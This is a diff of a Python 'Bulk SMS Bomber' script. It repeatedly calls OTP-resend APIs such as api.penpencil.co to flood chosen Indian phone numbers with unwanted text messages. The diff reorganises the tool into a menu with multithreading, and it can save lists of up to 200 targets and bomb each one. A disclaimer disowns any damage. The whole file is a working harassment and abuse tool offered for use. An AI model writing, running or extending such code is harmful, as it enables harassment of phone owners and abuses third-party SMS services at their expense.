@@ -1,75 +1,12 @@
-
-import os 
-def detect_os():
-    if os.name == 'nt':
-        return("Windows OS detected")
-    elif os.name == 'posix':
-        if 'Darwin' in os.uname():
-            return("Mac OS detected")
-        else:
-            return("Linux OS detected")
-    else:
-            return("Unknown OS detected")
-
-
-try : 
-    import requests
-    from requests.structures import CaseInsensitiveDict
-except : 
-    os.system("pip install requests")
-    if detect_os == "Windows OS detected" :
-        os.system("cls")
-    elif detect_os == "Linux OS detected" :
-        os.system("clear")
-    else : 
-        os.system("clear")
+import requests
+from requests.structures import CaseInsensitiveDict
+import os
 import threading
 
-if detect_os == "Windows OS detected" :
-        os.system("cls")
-elif detect_os == "Linux OS detected" :
-        os.system("clear")
-else : 
-        os.system("clear")
 
-print("""
-
-  ____  _    _ _      _  __   _____ __  __  _____   ____   ____  __  __ ____  ______ _____  
- |  _ \| |  | | |    | |/ /  / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
- | |_) | |  | | |    | ' /  | (___ | \  / | (___   | |_) | |  | | \  / | |_) | |__  | |__) |
- |  _ <| |  | | |    |  <    \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
- | |_) | |__| | |____| . \   ____) | |  | |____) | | |_) | |__| | |  | | |_) | |____| | \ \ 
- |____/ \____/|______|_|\_\ |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/|______|_|  \_\
-     | |               /\                                    (_)             | |            
-     | |__  _   _     /  \   _ __ _   _  __ _ _ __  _ __ __ _ _  ___ ___   __| | ___        
-     | '_ \| | | |   / /\ \ | '__| | | |/ _` | '_ \| '__/ _` | |/ __/ _ \ / _` |/ _ \       
-     | |_) | |_| |  / ____ \| |  | |_| | (_| | | | | | | (_| | | (_| (_) | (_| |  __/       
-     |_.__/ \__, | /_/    \_\_|   \__, |\__,_|_| |_|_|  \__,_| |\___\___/ \__,_|\___|       
-             __/ |                 __/ |                    _/ |                            
-            |___/                 |___/                    |__/                             
-
-Note : I won't be responsible for any damage caused by this script, Use at your own risk
-""")
-try : 
-    na = (int(input("Please enter how many targets you want : ")))
-except :
-    print("Enter a amount in number ")
- 
-
-for i in  range(na) :
-    number = input("Enter number without +91 : ")
-try : 
-    amount = int(input("Enter Amount to spam : "))
-    th = int(input("Enter thread amount (if you dont know enter 1 ) : "))
-except :
-    print("Enter a amount in number ")
-    
-if th == 1:
-    th = 2
-        
-
-def sms(number,amount) : 
-    
+def nsms(number,amount) : 
+    number = str(number)
+    amount = int(amount)
     url1 = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
     headers1 = CaseInsensitiveDict()
     headers1["Content-Type"] = "application/json"
@@ -295,19 +232,108 @@ def sms(number,amount) :
         resp16 = requests.post(url16, headers=headers16, data=data16)
         print("Sms sent")
 
+def sms(number, amount, th): 
+    threads = []
+    for _ in range(th):
+        thread = threading.Thread(target=nsms, args=(number, amount))
+        thread.start()
+        threads.append(thread)
+    for thread in threads:
+        thread.join()
+        print("Completed")
     
 
-    
 
 
-threads = []
 
-# Start the threads
-for _ in range(th):
-    thread = threading.Thread(target=sms, args=(number, amount))
-    thread.start()
-    threads.append(thread)
 
-for thread in threads:
-    thread.join()
-    print("Completed")
+
+
+
+
+
+
+
+
+def detect_os():
+    if os.name == 'nt':
+        return "Windows OS detected"
+    elif os.name == 'posix':
+        if 'Darwin' in os.uname():
+            return "Mac OS detected"
+        else:
+            return "Linux OS detected"
+    else:
+        return "Unknown OS detected"
+
+
+def clear_screen():
+    if detect_os() == "Windows OS detected":
+        os.system("cls")
+    elif detect_os() == "Linux OS detected":
+        os.system("clear")
+
+
+
+def main():
+    clear_screen()
+    print("""
+      ____  _    _ _      _  __   _____ __  __  _____   ____   ____  __  __ ____  ______ _____  
+     |  _ \| |  | | |    | |/ /  / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
+     | |_) | |  | | |    | ' /  | (___ | \  / | (___   | |_) | |  | | \  / | |_) | |__  | |__) |
+     |  _ <| |  | | |    |  <    \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
+     | |_) | |__| | |____| . \   ____) | |  | |____) | | |_) | |__| | |  | | |_) | |____| | \ \ 
+     |____/ \____/|______|_|\_\ |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/|______|_|  \_\
+         | |               /\                                    (_)             | |            
+         | |__  _   _     /  \   _ __ _   _  __ _ _ __  _ __ __ _ _  ___ ___   __| | ___        
+         | '_ \| | | |   / /\ \ | '__| | | |/ _` | '_ \| '__/ _` | |/ __/ _ \ / _` |/ _ \       
+         | |_) | |_| |  / ____ \| |  | |_| | (_| | | | | | | (_| | | (_| (_) | (_| |  __/       
+         |_.__/ \__, | /_/    \_\_|   \__, |\__,_|_| |_|_|  \__,_|_|\___\___/ \__,_|\___|       
+                 __/ |                 __/ |                    _/ |                            
+                |___/                 |___/                    |__/                             
+
+    Note : I won't be responsible for any damage caused by this script. Use at your own risk.
+    """)
+
+    option = input("Enter 1 For SMS bomber\nEnter 2 For Create a list SMS Bomber\nEnter 3 For Bomb from SMS Bomber List\nEnter Option: ")
+
+    if option == "1":
+        number = input("Enter target number without +91: ")
+        amount = int(input("Enter Amount to spam: "))
+        th = int(input("Enter thread amount (default is 1): ") or 1)
+        sms(number, amount,th)
+
+    elif option == "2":
+        print("You Selected to Create a list\n")
+        namel = input("Enter Name Of List: ")
+        dd = int(input("How many numbers do you want in your list (max 200): "))
+        if dd <= 200:
+            with open(f"{namel}_bomberlist.txt", "w") as file:
+                for _ in range(dd):
+                    number = input("Enter number without +91: ")
+                    file.write(f'{number}\n')
+        else:
+            print("Enter Valid Amount")
+
+    elif option == "3":
+        print("You Selected to Bomb with list\n")
+        jfile = input("Enter name of your list : ")
+        filename = jfile
+
+        if os.path.exists(f"{filename}_bomberlist.txt"):
+            print(filename)
+            with open(f'{filename}_bomberlist.txt',"r") as f:
+                numbers = f.read().splitlines()
+                th = int(input("Enter thread amount (default is 1): ") or 1)
+                amount  = int(input("Enter amount of messages to send: "))
+            for number in numbers:
+                sms(number, amount,th)
+            
+        else:
+            print("List Not Found")
+    else:
+        print("Invalid Option")
+
+
+if __name__ == "__main__":
+    main()
